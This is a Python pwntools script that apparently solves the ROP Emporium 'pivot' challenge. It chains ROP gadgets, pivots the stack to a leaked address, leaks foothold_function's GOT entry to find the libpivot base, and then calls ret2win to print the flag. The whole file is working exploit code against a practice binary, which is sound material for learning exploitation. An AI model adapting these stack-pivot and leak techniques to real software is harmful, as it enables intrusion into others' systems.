from pwn import * 

elf=ELF("pivot")
libpivot=ELF("libpivot.so")
r=ROP([elf])
p=process(elf.path)
#p = gdb.debug(elf.path, aslr=False, gdbscript='b *pwnme+143')

ret = p64(r.find_gadget(["ret"])[0])
pop_rdi=p64(r.find_gadget(["pop rdi","ret"])[0])
pop_rsi=p64(r.find_gadget(["pop rsi","pop r15","ret"])[0])
pop_rax=p64(r.find_gadget(["pop rax","ret"])[0])
#mov rax,[rax]
mov_rax_addr_rax=p64(0x004009c0)
call_rax=p64(0x00000000004006b0)
xchg=p64(0x004009bd)
p.recvuntil(b'to pivot: ')
#leak to pivot
leak_pivot=int(p.recv(14),16)
p.recvuntil(b'>')
payload_pivot=p64(elf.sym.foothold_function)
payload_pivot+=pop_rdi+p64(elf.got.foothold_function)+p64(elf.plt.puts)
payload_pivot+=pop_rdi+p64(0)+pop_rsi+p64(elf.bss()+100)+p64(0)+p64(elf.sym.read)
payload_pivot+=pop_rax+p64(elf.bss()+100)+mov_rax_addr_rax+call_rax

p.send(payload_pivot)


p.recvuntil(b'> ')
payload=b'A'*40
payload+=pop_rax+p64(leak_pivot)+xchg
p.send(payload)
p.recvuntil(b'libpivot')
p.recvuntil(b'\n')
data = p.recvline().strip()
leak_libpivot = u64(data.ljust(8, b'\x00'))
print(hex(leak_libpivot))
libpivot.address=leak_libpivot - libpivot.sym.foothold_function
print(hex(libpivot.sym.ret2win))
p.send(p64(libpivot.sym.ret2win))
print(p.recvuntil('}'))